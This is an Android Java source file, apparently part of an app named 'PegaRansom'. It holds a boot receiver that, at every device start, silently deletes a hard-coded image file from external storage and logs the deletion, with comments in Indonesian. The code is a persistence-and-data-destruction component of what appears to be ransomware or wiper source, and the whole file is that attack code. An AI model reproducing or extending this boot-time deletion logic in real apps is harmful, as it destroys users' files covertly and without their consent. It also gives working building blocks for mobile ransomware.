package com.pegaransom.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import java.io.File;

public class BootReceiver extends BroadcastReceiver {
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
            // Hapus file saat boot/reboot
            deleteTargetFile();
        }
    }
    
    private void deleteTargetFile() {
        try {
            String path = Environment.getExternalStorageDirectory().getAbsolutePath() + 
                         "/Pictures/100PINT/Pins/tes.jpg";
            File file = new File(path);
            
            if (file.exists()) {
                file.delete();
                // Log ke system
                android.util.Log.d("PegaRansom", "File deleted on boot: " + path);
            }
        } catch (Exception e) {
            android.util.Log.e("PegaRansom", "Boot delete error: " + e.getMessage());
        }
    }
}
